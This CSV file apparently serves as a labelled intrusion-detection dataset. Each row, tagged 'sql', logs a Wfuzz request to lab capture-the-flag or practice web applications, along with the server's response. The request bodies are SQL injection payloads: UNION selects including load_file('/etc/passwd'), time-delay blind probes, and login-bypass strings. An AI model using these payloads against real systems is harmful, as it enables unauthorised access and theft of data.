attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Connection,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
sql,192.168.1.39,80,"username=' union select 1,load_file('/etc/passwd'),1,1,1;&password=admin123&submit=submit",*/*,,89,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,446,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56570
sql,192.168.1.39,80,"username=' union select * from users where login = char(114,111,111,116);&password=admin123&submit=submit",*/*,,105,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'login' in 'where clause' in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,420,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56571
sql,192.168.1.39,80,username=' UNION SELECT&password=admin123&submit=submit,*/*,,55,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,543,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56572
sql,192.168.1.39,80,username=' union all select @@version--&password=admin123&submit=submit,*/*,,71,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,543,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56573
sql,192.168.60.165,80,id=')))))) waitfor delay '0:0:20' --,*/*,,36,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46646
sql,192.168.60.165,80,"id="")))))) waitfor delay '0:0:20' /*",*/*,,36,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46658
sql,192.168.60.165,80,"id="")))))) waitfor delay '0:0:20' --",*/*,,36,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46672
sql,192.168.60.165,80,"id="")) waitfor delay '0:0:20' /*",*/*,,32,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46688
sql,192.168.60.165,80,"id=',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",*/*,,69,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46698
sql,192.168.60.165,80,"id=,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",*/*,,68,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46714
sql,192.168.60.165,80,"id=""),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",*/*,,65,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46728
sql,192.168.60.165,80,"id='))) and 0=benchmark(3000000,MD5(1))%20/*",*/*,,44,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46736
sql,192.168.60.165,80,"id=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",*/*,,74,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46750
sql,192.168.60.165,80,"id=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*",*/*,,74,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/sqli_blind/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Thu, 02 Mar 2023 09:48:03 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,46752
sql,192.168.1.40,80,"username=admin"") or ""1""=""1""/*&password=admin",*/*,,44,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38640
sql,192.168.1.40,80,"username=admin"") or ""1""=""1""#&password=admin",*/*,,43,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38644
sql,192.168.1.40,80,"username=admin"") or ""1""=""1""--&password=admin",*/*,,44,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38652
sql,192.168.1.40,80,"username=admin"") or ""1""=""1&password=admin",*/*,,41,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38654
sql,192.168.1.40,80,"username=admin"") or (""1""=""1""--&password=admin",*/*,,45,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38662
sql,192.168.1.40,80,"username=admin"") or (""1""=""1""/*&password=admin",*/*,,45,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38664
sql,192.168.1.40,80,"username=admin""or 1=1 or """"=""&password=admin",*/*,,44,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38666
sql,192.168.1.40,80,"username=admin"" or ""1""=""1""--&password=admin",*/*,,43,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38668
sql,192.168.1.40,80,"username=admin"" #&password=admin",*/*,,32,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38684
sql,192.168.1.40,80,"username=admin"" or ""1""=""1&password=admin",*/*,,40,application/x-www-form-urlencoded,192.168.1.40,Wfuzz/3.1.0,POST,http://192.168.1.40/app1/chall2/,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,358,text/html; charset=UTF-8,"Tue, 28 Feb 2023 22:21:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.39,38690
